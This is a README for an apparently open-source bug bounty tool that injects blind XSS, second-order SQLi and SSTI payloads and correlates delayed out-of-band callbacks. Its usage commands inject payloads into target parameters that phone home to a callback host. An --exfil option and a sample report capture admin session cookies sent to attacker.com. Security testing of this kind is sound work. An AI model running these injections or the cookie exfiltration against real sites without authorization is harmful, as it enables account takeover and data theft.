# Ricochet

Second-order vulnerability detection for bug bounty hunters. Detects blind XSS, stored XSS, second-order SQLi, and SSTI through out-of-band callback correlation.

**Zero external dependencies** — Pure Python stdlib.

## The Problem

You inject a payload. It doesn't execute immediately — it fires hours later when an admin views it, or when a background job processes it, or when it hits a different endpoint entirely.

Traditional scanners miss this. Ricochet catches it.

## Install

```bash
git clone https://github.com/invaen/ricochet.git
cd ricochet
python3 -m ricochet --help
```

Or install as a module:
```bash
pip install -e .
```

## Quick Start

```bash
# Terminal 1: Start callback listener
python3 -m ricochet listen --http --port 8888

# Terminal 2: Inject payloads
python3 -m ricochet inject -u "http://target.com/feedback" \
    -p "message" \
    --callback "http://YOUR_IP:8888"

# Check for hits (callbacks that fired)
python3 -m ricochet findings

# Generate bug bounty report
python3 -m ricochet report --correlation-id <ID>
```

## Features

### Callback Servers
```bash
# HTTP callback server
ricochet listen --http --port 8888

# DNS callback server (catches firewall-bypassing exfil)
ricochet listen --dns --port 5353 --domain cb.yourdomain.com

# Use Interactsh for external callbacks
ricochet interactsh --server your-interactsh-server.com
```

### Injection Modes
```bash
# Target specific parameter
ricochet inject -u "http://target.com/search" -p "q" --callback "http://cb:8888"

# Parse Burp request file
ricochet inject -r request.txt --callback "http://cb:8888"

# Auto-discover injection points
ricochet crawl -u "http://target.com" --depth 3
ricochet inject --from-crawl --callback "http://cb:8888"

# Custom payloads
ricochet inject -u "http://target.com/api" -p "data" --payloads wordlist.txt
```

### Payload Types
```bash
# XSS (fires in browser context)
--type xss

# SQL Injection (out-of-band via DNS/HTTP)
--type sqli

# Server-Side Template Injection
--type ssti

# Polyglots (work across multiple contexts)
--type polyglot
```

### Trigger Assistance
```bash
# Passive mode: inject and poll for callbacks
ricochet passive -u "http://target.com/submit" -p "comment" \
    --callback "http://cb:8888" --poll-interval 30

# Active mode: probe admin endpoints to trigger execution
ricochet active --callback "http://cb:8888" --target "http://target.com"

# Get suggestions for where payloads might fire
ricochet suggest --parameter "username"
```

### Output & Reporting
```bash
# View findings
ricochet findings                    # Human-readable
ricochet findings -o json            # JSONL for automation
ricochet findings --verbose          # Full payload/response details

# Generate bug bounty report
ricochet report --correlation-id abc123def456
ricochet report --all --output ./reports/  # All findings

# Proxy through Burp
ricochet inject -u "http://target.com" -p "q" --proxy "http://127.0.0.1:8080"
```

## How It Works

1. **Inject** — Ricochet injects payloads with unique correlation IDs
2. **Wait** — Payloads sit dormant until triggered (admin view, cron job, etc.)
3. **Callback** — When payload executes, it phones home with the correlation ID
4. **Correlate** — Ricochet matches callback to original injection point
5. **Report** — Generate PoC with exact reproduction steps

```
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│   Inject    │────▶│   Target    │────▶│  Database   │
│  Payloads   │     │  Endpoint   │     │  (stored)   │
└─────────────┘     └─────────────┘     └──────┬──────┘
                                               │
       ┌───────────────────────────────────────┘
       │ Hours/days later...
       ▼
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│   Admin     │────▶│  Payload    │────▶│  Callback   │
│   Views     │     │  Executes   │     │  Server     │
└─────────────┘     └─────────────┘     └──────┬──────┘
                                               │
                                               ▼
                                        ┌─────────────┐
                                        │  Correlated │
                                        │   Finding   │
                                        └─────────────┘
```

## XSS Metadata Capture

When XSS fires, Ricochet captures context:

```json
{
  "url": "https://target.com/admin/tickets/view?id=1337",
  "cookies": "session=abc123; admin=true",
  "dom": "<html>...(truncated)...</html>",
  "user_agent": "Mozilla/5.0..."
}
```

Use exfiltration payloads for rich metadata:
```bash
ricochet inject -u "http://target.com" -p "comment" --type xss --exfil
```

## Bug Bounty Reports

Generate submission-ready reports:

```bash
ricochet report --correlation-id abc123def456
```

Output:
```markdown
## Summary
Stored XSS vulnerability in `comment` parameter at `https://target.com/feedback`

## Severity
HIGH - Stored XSS in admin context with cookie capture

## Steps to Reproduce
1. Navigate to: https://target.com/feedback
2. Enter payload: <script>...</script>
3. Submit the form
4. Wait for admin to view submission
5. Observe callback at: http://attacker.com/abc123def456

## Proof of Concept
- Correlation ID: abc123def456
- Delay: 3600.0 seconds (stored, triggered later)
- Captured cookies: session=abc123

## Impact
...
```

## CLI Reference

| Command | Description |
|---------|-------------|
| `listen` | Start HTTP/DNS callback server |
| `interactsh` | Use Interactsh for external callbacks |
| `inject` | Inject payloads into target |
| `crawl` | Auto-discover injection points |
| `findings` | Show correlated findings |
| `passive` | Inject + poll mode |
| `active` | Probe endpoints to trigger execution |
| `suggest` | Get trigger point suggestions |
| `report` | Generate bug bounty reports |

## Part of the Toolkit

Ricochet works alongside:
- [ghost-recon](https://github.com/invaen/ghost-recon) — Reconnaissance & fingerprinting
- [diff-hunter](https://github.com/invaen/diff-hunter) — Attack surface monitoring
- [js-surgeon](https://github.com/invaen/js-surgeon) — JavaScript static analysis
- [context-cannon](https://github.com/invaen/context-cannon) — Adaptive payload generation
- [venom-cache](https://github.com/invaen/venom-cache) — Cache poisoning detection

## License

MIT
